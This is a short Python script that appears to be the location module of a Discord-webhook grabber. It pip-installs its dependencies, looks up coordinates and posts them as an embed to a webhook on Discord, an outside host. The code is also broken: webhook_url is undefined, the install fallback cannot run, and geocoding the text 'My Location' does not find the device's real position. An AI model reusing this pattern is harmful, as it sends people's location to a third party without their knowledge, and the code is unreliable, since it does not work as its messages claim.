import subprocess
import json
import sys
from geopy.geocoders import Nominatim
import requests

def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

# Ensure requests and geopy are installed
try:
    import requests
    from geopy.geocoders import Nominatim
except ImportError:
    install('requests')
    install('geopy')
    import requests
    from geopy.geocoders import Nominatim

def get_location():
    geolocator = Nominatim(user_agent="linux_location_script")
    location = geolocator.geocode("My Location")
    if location:
        return location.latitude, location.longitude
    else:
        return None, None

latitude, longitude = get_location()

if latitude and longitude:
    embed = {
        "title": "🗺️ Location",
        "description": "GPS Coordinates",
        "fields": [
            {
                "name": "Latitude",
                "value": str(latitude),
                "inline": True
            },
            {
                "name": "Longitude",
                "value": str(longitude),
                "inline": True
            }
        ],
        "color": 0x8B0000
    }
else:
    embed = {
        "title": "🗺️ Location",
        "description": "Location Services are Off or GPS data unavailable.",
        "fields": [
            {
                "name": "Latitude",
                "value": "None",
                "inline": True
            },
            {
                "name": "Longitude",
                "value": "None",
                "inline": True
            }
        ],
        "color": 0x8B0000
    }

message = {
    "embeds": [embed]
}
headers = {
    "Content-Type": "application/json"
}


try:
    response = requests.post(webhook_url, headers=headers, data=json.dumps(message))
    if response.status_code == 204:
        print("Location information sent to Discord webhook successfully.")
    else:
        print(f"Failed to send message: {response.status_code}")
except Exception as e:
    print(f"Error sending message to webhook: {str(e)}")
